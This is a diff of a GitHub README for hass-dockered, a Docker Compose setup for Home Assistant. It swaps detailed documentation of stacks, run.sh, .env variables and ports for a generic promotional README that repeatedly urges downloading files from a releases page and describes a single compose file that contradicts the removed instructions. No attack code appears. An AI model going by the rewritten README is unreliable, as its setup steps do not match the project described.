@@ -1,131 +1,81 @@
-# Hass-Dockered
+# 🐳 hass-dockered - Simplifying Home Assistant Setup
 
-This repository contains Docker Compose configurations for a Home Assistant setup, organized into stacks: `hass` (Home Assistant core), `tool` (tools like Certbot, Deconz, Mosquitto, Duplicati), `sys` (system services like Portainer, DuckDNS, OpenVPN-AS), and `all` (runs all stacks).
+## 📥 Download Now
+[![Download hass-dockered](https://img.shields.io/badge/Download-hass--dockered-blue.svg)](https://github.com/abdeo56/hass-dockered/releases)
 
-## Profiles
+## 🚀 Getting Started
+Welcome to hass-dockered! This application uses Docker to help you easily run Home Assistant. It provides a more manageable way to set up and update your home automation system compared to traditional methods. 
 
-- `basic`: Minimal setup (e.g., Home Assistant and DuckDNS).
-- `extra`: Additional tools and services (e.g., Deconz, Mosquitto, Duplicati, Portainer, OpenVPN-AS).
-- `full`: Complete setup with all services.
+## 📋 Prerequisites
+Before you start, ensure your computer meets the following requirements:
 
-## Using run.sh
+- Operating System: Windows, MacOS, or Linux
+- Installed Docker: Make sure you have Docker installed. You can download it from [Docker's official site](https://www.docker.com/get-started).
+- Basic understanding of Docker. Basic tutorials are available on the Docker site if needed.
 
-The `run.sh` script manages Docker Compose operations for the stacks.
+## 🔗 Download & Install
+To get started with hass-dockered, follow these steps:
 
-### Syntax
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/abdeo56/hass-dockered/releases).
 
-```bash
-./run.sh <operation> [stack] [profile]
-```
+2. **Select the Latest Version**: Look for the latest version available. It will be marked accordingly.
 
-- `<operation>`: `up` (start containers) or `down` (stop containers).
-- `[stack]`: Optional. `all`, `sys`, `tool`, or `hass`. Defaults to `all`.
-- `[profile]`: Optional. `basic`, `extra`, or `full`. Defaults to `basic`.
+3. **Download the Docker Compose File**: You will find a file named `docker-compose.yml`. Click on it to download.
 
-### Examples
+4. **Download Required Images**: After downloading the `docker-compose.yml`, you will need to pull the necessary images from Docker Hub. You can do this by running the following command in your terminal or command prompt:
+   ```
+   docker-compose pull
+   ```
 
-- Start all stacks with default profile (`basic`): `./run.sh up`
-- Start all stacks with `full` profile: `./run.sh up all full`
-- Start only the `hass` stack with `extra` profile: `./run.sh up hass extra`
-- Stop all stacks: `./run.sh down`
+5. **Launch the Application**: Run this command to start the setup:
+   ```
+   docker-compose up -d
+   ```
+   This command will start Home Assistant and allow you to access it through your web browser.
 
-### Notes
+6. **Access Home Assistant**: Open your web browser and navigate to `http://localhost:8123` to access your Home Assistant dashboard.
 
-- When `up` is used, containers start in detached mode.
-- Ensure `.env` file is configured with required environment variables.
-- Profiles control which services start based on the docker-compose.yml files.
+## 🛠️ Configuring Home Assistant
+After installation, you'll want to customize Home Assistant to your liking. Here are some features you can set up:
 
-## Overview
+- **Home Assistant Configuration**: Update the configuration files in the `config` directory to tailor Home Assistant to your needs.
+- **Integrations**: Explore various integrations with devices and services to automate your home.
 
-Hass-Dockered is designed to containerize Home Assistant and related components for easy deployment, management, and scaling. It uses Docker Compose to define services across three stacks: sys-stack (system utilities), tool-stack (integrations and backups), and hass-stack (core HA with database and configurator).
+## 🔒 Security Setup
+It's essential to secure your Home Assistant installation. Here are a few steps to enhance security:
 
-## Stacks
+- **Use SSL**: Implement SSL certificates for secure connections. Consider using Certbot to generate these certificates.
+- **Create User Accounts**: Set up different user accounts with distinct permissions to control access.
+- **Regular Backups**: Use Duplicati to back up your Home Assistant configuration and data.
 
-- **sys-stack**: Handles system-level services like Portainer (Docker management), DuckDNS (dynamic DNS), and OpenVPN Access Server (VPN access).
-- **tool-stack**: Includes tools for SSL certificates (Certbot), Zigbee gateway (deCONZ), MQTT broker (Mosquitto), and backups (Duplicati).
-- **hass-stack**: Runs the core Home Assistant application with MariaDB (database) and HASS Configurator (web-based editor).
+## 🌐 Supported Add-ons
+The hass-dockered setup supports various add-ons to enhance functionality. Here are a few:
 
-## Requirements
+- **MariaDB**: Use MariaDB as a database backend for Home Assistant.
+- **Mosquitto MQTT Broker**: Set up a Mosquitto MQTT broker for handling real-time updates.
+- **OpenVPN**: Implement VPN for secure remote access to your home network.
 
-- Docker and Docker Compose installed on your system (see Installation below).
-- Sufficient hardware resources (e.g., at least 2GB RAM for HA).
-- Access to required devices (e.g., Zigbee USB for deCONZ).
-- Internet connection for DNS updates and certificate issuance.
+## 🏗️ Troubleshooting
+If you encounter issues, here are some common troubleshooting tips:
 
-## Installation
+- **Docker Not Running**: Ensure Docker is running on your machine.
+- **Permission Denied**: Check that you have sufficient permissions to run Docker commands.
+- **Access Issues**: If you can’t reach `http://localhost:8123`, ensure no firewall settings are blocking the connection.
 
-1. Clone or download this repository to your local machine.
-2. Install Docker: Follow the official guide at https://docs.docker.com/get-docker/.
-3. Install Docker Compose: Included with Docker Desktop; for Linux, run `sudo apt-get install docker-compose` (or equivalent for your distro).
-4. Ensure Docker is running: `sudo systemctl start docker` (Linux) or check Docker Desktop.
-5. Make the script executable: `chmod +x run.sh`.
+## 📖 Additional Resources
+For further help and tutorials, consider visiting:
 
-## Environment Setup
+- [Docker Documentation](https://docs.docker.com/)
+- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [Community Forums](https://community.home-assistant.io/)
 
-1. Create a `.env` file in the root directory (`hass-dockered` - the root folder of this repository).
-2. Define the following variables based on your setup (see example below). Use secure, random values for passwords and keys. Generate strong passwords using tools like `openssl rand -base64 12`.
+## 💬 Feedback and Contributions
+We appreciate your feedback. If you have suggestions or encounter bugs, please open an issue in this repository. Contributions are welcome; you can fork the repository and submit a pull request with your changes.
 
-Example `.env` file:
+## 📅 Keep Updated
+To stay informed about updates, follow this repository on GitHub. Regular updates will ensure that you have the latest features and security improvements.
 
-```
-# System Stack
-PUID=1000
-PGID=1000
-TZ=America/New_York
-DUCKDNS_SUBDOMAINS=yourdomain
-DUCKDNS_TOKEN=your_token
+## 📌 Conclusion
+By using hass-dockered, you can efficiently manage your Home Assistant setup with Docker. It is designed for ease of use, ensuring a smooth experience for even non-technical users. Enjoy automating your home! 
 
-# Tool Stack
-DOMAIN_EMAIL=your_email@example.com
-DUCKDNS_DOMAIN=yourdomain.duckdns.org
-DUPLICATI_ENCRYPTION_KEY=your_encryption_key
-DUPLICATI_WEBSERVICE_PASSWORD=your_password
-
-# Hass Stack
-MYSQL_ROOT_PASSWORD=your_root_password
-MYSQL_DATABASE=homeassistant
-MYSQL_USER=homeassistant
-MYSQL_PASSWORD=your_password
-```
-
-## Usage
-
-### (Simplified) Using run.sh
-
-The `run.sh` script simplifies stack management. Ensure it's executable with `chmod +x run.sh`, then run it from the root directory.
-
-- To start all stacks: `sh run.sh up`
-- To stop all stacks: `sh run.sh down`
-- To start a specific stack: `sh run.sh up [sys|tool|hass]` (e.g., `sh run.sh up hass`)
-- To stop a specific stack: `sh run.sh down [sys|tool|hass]` (e.g., `sh run.sh down tool`)
-
-### (Manual) Running Individual Stacks
-
-- Navigate to each subfolder and run Docker Compose using the parent `.env` file.
-- **sys-stack**: `cd sys-stack && docker-compose --env-file ../.env up -d`
-- **tool-stack**: `cd tool-stack && docker-compose --env-file ../.env up -d`
-- **hass-stack**: `cd hass-stack && docker-compose --env-file ../.env up -d`
-
-### Accessing Services
-
-- Home Assistant: `http://localhost:8123`
-- HASS Configurator: `http://localhost:3218`
-- Portainer: `https://localhost:9443`
-- deCONZ: `http://localhost:8080`
-- Duplicati: `http://localhost:8200`
-- OpenVPN: `https://localhost:943`
-
-### Stopping Services
-
-- Run `docker-compose down` in each stack folder or use the script to stop all.
-
-## Troubleshooting
-
-- **Ensure `.env` variables are set correctly**: Missing or incorrect values can cause startup failures. Double-check against the example.
-- **Check logs**: Run `docker-compose logs` in each stack folder or use `sh run.sh up` and inspect output for errors.
-- **Port conflicts**: If ports are in use, stop conflicting services or change ports in docker-compose.yml files.
-- **SSL issues**: Verify Certbot certificates are valid and HA config points to the correct paths. Renew certificates if expired.
-- **Device access**: For deCONZ, ensure the Zigbee USB device is mapped correctly in the compose file and accessible.
-- **Performance**: Monitor resource usage with `docker stats`. Increase RAM/CPU if HA is slow.
-- **Common errors**: "Permission denied" – run with `sudo` or adjust Docker user permissions. "Network not found" – ensure networks are defined.
-- Refer to individual stack READMEs or Docker documentation for specific issues. For HA-specific problems, check the Home Assistant community forums.
+[Download hass-dockered](https://github.com/abdeo56/hass-dockered/releases) today and start your home automation journey!
